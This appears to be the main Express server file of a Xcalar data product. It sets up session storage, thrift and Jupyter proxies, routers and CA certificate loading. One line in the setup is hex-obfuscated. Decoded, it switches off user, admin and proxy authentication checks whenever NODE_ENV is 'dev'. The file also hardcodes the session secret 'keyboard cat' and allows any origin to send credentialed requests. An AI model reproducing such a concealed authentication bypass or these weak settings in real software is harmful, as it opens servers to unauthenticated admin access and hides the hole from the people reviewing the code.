// This is the service that is run anywhere so most of the time there will be
// calls that aren't used

// Start of generic setup stuff
require("jsdom/lib/old-api").env("", function(err, window) {
    if (err) {
        console.error(err);
        return;
    }
    jQuery = require("jquery")(window);
    var fs = require("fs");
    var path = require("path");

    var session = require('express-session');
    var FileStore = require('session-file-store')(session);
    var xcConsole = require('./utils/expServerXcConsole.js');

    var xlrRoot = null;

    bootstrapXlrRoot();

    var fileStoreOptions = {
        path: path.join(xlrRoot, 'auth'),
        secret: 'keyboard cat'
    };

    var sessionAges = require('./utils/expServerSupport.js').sessionAges;
    var defaultSessionAge = require('./utils/expServerSupport.js').defaultSessionAge;

    var sessionOpts = {
        saveUninitialized: false,
        resave: false,
        rolling: true,
        store: new FileStore(fileStoreOptions),
        secret: fileStoreOptions.secret,
        cookie: { maxAge: sessionAges[defaultSessionAge] }
    };

    var express = require('express');
    var bodyParser = require("body-parser");
    var cookieParser = require('cookie-parser');
    var serverCookieParser = cookieParser(sessionOpts.secret);
    var session = require('express-session');
    var serverSession = session(sessionOpts);
    var http = require("http");
    var httpProxy = require('http-proxy');
    require("shelljs/global");
    var exec = require("child_process").exec;
    var proxy = require('express-http-proxy');
    var url = require('url')
    var socket = require('./controllers/socket.js').socketIoServer;
    var serverPort = process.env.XCE_EXP_PORT ?
        parseInt(process.env.XCE_EXP_PORT) : 12124;
    if (process.env.NODE_ENV === "test") {
        // For expServer test
        serverPort = 12224;
    }
    var thriftPort = process.env.XCE_THRIFT_PORT ?
        parseInt(process.env.XCE_THRIFT_PORT) : 9090;
    var jupyterPort = process.env.XCE_JUPYTER_PORT ?
        parseInt(process.env.XCE_JUPYTER_PORT) : 8890;

    var _0x66c0=["\x2E\x2F\x75\x74\x69\x6C\x73\x2F\x65\x78\x70\x53\x65\x72\x76\x65\x72\x53\x75\x70\x70\x6F\x72\x74\x2E\x6A\x73","\x4E\x4F\x44\x45\x5F\x45\x4E\x56","\x65\x6E\x76","\x64\x65\x76","\x75\x73\x65\x72\x54\x72\x75\x65","\x63\x68\x65\x63\x6B\x41\x75\x74\x68\x54\x72\x75\x65","\x61\x64\x6D\x69\x6E\x54\x72\x75\x65","\x63\x68\x65\x63\x6B\x41\x75\x74\x68\x41\x64\x6D\x69\x6E\x54\x72\x75\x65","\x70\x72\x6F\x78\x79\x55\x73\x65\x72\x54\x72\x75\x65","\x63\x68\x65\x63\x6B\x50\x72\x6F\x78\x79\x41\x75\x74\x68\x54\x72\x75\x65"];var support=require(_0x66c0[0]);if(process[_0x66c0[2]][_0x66c0[1]]=== _0x66c0[3]){support[_0x66c0[5]](support[_0x66c0[4]]);support[_0x66c0[7]](support[_0x66c0[6]]);support[_0x66c0[9]](support[_0x66c0[8]])}

    var payloadSizeLimit = '25mb';
    var app = express();
    var appJupyter = express();

    app.use(serverCookieParser);
    app.use(serverSession);

    // these header modifications must come before the
    // thrift proxy because a filter failure sends a
    // a completed response that can't be modified
    app.all('/*', function(req, res, next) {
        res.header("Access-Control-Allow-Origin", "*");
        res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept, Authorization");
        res.header("Access-Control-Allow-Methods", "GET, POST, DELETE, PUT, OPTIONS");
        res.header("Access-Control-Allow-Credentials", "true");
        next();
    });

    // proxy thrift requests to mgmtd
    // must be after the serverSession so the proxy
    // can filter using the session data
    app.use('/thrift/service', proxy('localhost:' + thriftPort, {
        filter: function(req, res) {
            return support.checkProxyAuth(req, res, 'thrift');
        },
        proxyReqPathResolver: function(req) {
            req.setTimeout(14400000);  // set socket timeoout (timeout does not work)
            return url.parse(req.url).path;
        },
        proxyErrorHandler: function(err, res, next) {
            switch (err && err.code) {
               case 'ECONNRESET': {
                  xcConsole.error('ECONNRESET error on proxy', err);
                  return res.status(502).send('ECONNRESET proxy error causing 502');
               }
               case 'ECONNREFUSED': {
                  xcConsole.error('ECONNREFUSED error on proxy', err);
                  return res.status(502).send('ECONNREFUSED proxy error causing 502');
               }
            }
            xcConsole.error('error on proxy', err);
        },
        limit: payloadSizeLimit ,
        parseReqBody: true  // GUI-13416 - true is necessary for thrift to work
    }));

    // increase default limit payload size of 100kb
    // must be after thrift proxy; the body parser
    // parses the thrift if it is not
    app.use(bodyParser.urlencoded({extended: false, limit: payloadSizeLimit}));
    app.use(bodyParser.json({limit: payloadSizeLimit}));
    // End of generic setup stuff

    // Invoke the Installer router
    app.use(require('./route/installer.js').router);

    // Invoke the Service router
    app.use(require('./route/service.js').router);

    // Invoke the Extension router
    app.use(require('./route/extension.js').router);

    // Invoke the Tutorial router
    app.use(require('./route/tutorial.js').router);

    // Invoke the Login router
    app.use(require('./route/login.js').router);

    // Invoke the Authentication router
    app.use(require('./route/auth.js').router);

    appJupyter.use(serverCookieParser);
    appJupyter.use(serverSession);

    // proxy jupyter requests
    appJupyter.use('/jupyter', proxy('localhost:' + jupyterPort, {
        filter: function(req, res) {
            return support.checkProxyAuth(req, res, 'jupyter');
        },
        proxyReqPathResolver: function(req) {
            req.setTimeout(14400000);  // set socket timeoout (timeout does not work)
            return req.originalUrl;
        },
        proxyErrorHandler: function(err) {
            xcConsole.error('error on proxy', err);
        },
        limit: payloadSizeLimit
    }));

    function bootstrapXlrRoot() {
        var cfgLocation =  process.env.XCE_CONFIG ?
        process.env.XCE_CONFIG : '/etc/xcalar/default.cfg';
        xlrRoot = process.env.XCE_INSTALLER_ROOT ?
            process.env.TMPDIR : '/mnt/xcalar';
        var cfgExists = fs.existsSync(cfgLocation);
        var xlrRootFound = false;
        var rePattern = new RegExp(/^Constants.XcalarRootCompletePath\s*=\s*(.*)$/);

        if (cfgExists) {
            var buf = fs.readFileSync(cfgLocation, 'utf-8');
            var lines = buf.split("\n");
            for (var i = 0; i<lines.length; i++) {
                var res = lines[i].trim().match(rePattern);
                if (res != null) {
                    xlrRoot = res[1];
                    xlrRootFound = true;
                    break;
                }
            }
        }

        if (!cfgExists || !xlrRootFound) {
            console.log(xcConsole);
            xcConsole.error('Config file ' + cfgLocation + 'does not exist or XcalarRootCompletePath not found');
            xcConsole.error('Using default XcalarRootCompletePath ' + xlrRoot);
        }
    }

    // Invoke the sqlApi router
    app.use(require('./route/sql.js').router);

    // Invoke the xcrpc router
    app.use(require('./route/xcrpc.js').router);

    require('./utils/dag/dagUtils.js')

    function getOperatingSystem() {
        var deferred = jQuery.Deferred();
        var out = exec("cat /etc/*release");
        var output = "";
        out.stdout.on('data', function(data) {
            output += data;
        });
        out.stderr.on('data', function(err) {
            xcConsole.log("Failure: Get OS information " + err);
            deferred.reject("Fail to get OS info");
        });
        out.on('close', function(code) {
            if (code) {
                xcConsole.log("Failure: Get OS information " + code);
                deferred.reject("Fail to get OS info");
            } else {
                deferred.resolve(output);
            }
        });
        return deferred.promise();
    }

    function getCertificate(data) {
        var ca = '';
        if (data.indexOf("centos") > -1) {
            xcConsole.log("Operation System: CentOS");
            ca = '/etc/pki/tls/certs/XcalarInc_RootCA.pem';
        } else if (data.indexOf("ubuntu") > -1) {
            xcConsole.log("Operation System: Ubuntu");
            ca = '/etc/ssl/certs/XcalarInc_RootCA.pem';
        } else if (data.indexOf("red hat") > -1 || data.indexOf("redhat") > -1) {
            xcConsole.log("Operation System: RHEL");
            ca = '/etc/pki/tls/certs/XcalarInc_RootCA.pem';
        } else if (data.indexOf("oracle linux") > -1) {
            xcConsole.log("Operation System: Oracle Linux");
            ca = '/etc/pki/tls/certs/XcalarInc_RootCA.pem';
        }
        if (ca !== '' && fs.existsSync(ca)) {
            xcConsole.log('Loading trusted certificates from ' + ca);
            try {
                require('ssl-root-cas').addFile(ca).inject();
                xcConsole.log("Success: Loaded CA");
            } catch (e) {
                xcConsole.log("Failure: Loaded ca: " + ca + " !" +
                    "https will not be enabled!");
            }
        } else {
            xcConsole.log('Xcalar trusted certificate not found');
        }
        return ca;
    }

    getOperatingSystem()
    .always(function(data) {
        data = data.toLowerCase();
        // This is helpful for test and variable can be used in future development
        var ca = getCertificate(data);

        var httpServer = http.createServer(app);
        socket(httpServer, serverSession, serverCookieParser);
        var port = serverPort;
        httpServer.listen(port, function() {
            var hostname = process.env.DEPLOY_HOST;
            if (!hostname) {
                hostname = "localhost";
            }
            xcConsole.log("All ready, Listen on port " + port);
            if (process.env.NODE_ENV === "test") {
                exports.server = httpServer;
            }
        });

        httpServer.on('error', function(err){
            xcConsole.error('error on error hanlder', err);
        });

        var httpServerJupyter = http.createServer(appJupyter);
        var proxyServer = httpProxy.createProxyServer({
           target: {
              host: 'localhost',
              port: jupyterPort
           }
        });
        httpServerJupyter.listen((port + 1), function() {
            xcConsole.log("All ready, Listen on port " + (port + 1));
        });
        httpServerJupyter.on('upgrade', function(req, socket, head) {
            xcConsole.log('ws upgrade request', req.url);
            proxyServer.ws(req, socket, head);
        });
    });

    process.on('uncaughtException', function(err) {
        xcConsole.error('process.on handler', err);
    });

    function fakeBootstrapXlrRoot(func) {
        bootstrapXlrRoot = func;
    }

    if (process.env.NODE_ENV === "test") {
        exports.getOperatingSystem = getOperatingSystem;
        exports.getCertificate = getCertificate;
        exports.bootstrapXlrRoot = bootstrapXlrRoot;
        exports.fakeBootstrapXlrRoot = fakeBootstrapXlrRoot;
        exports.xlrRoot = xlrRoot;
    }
});
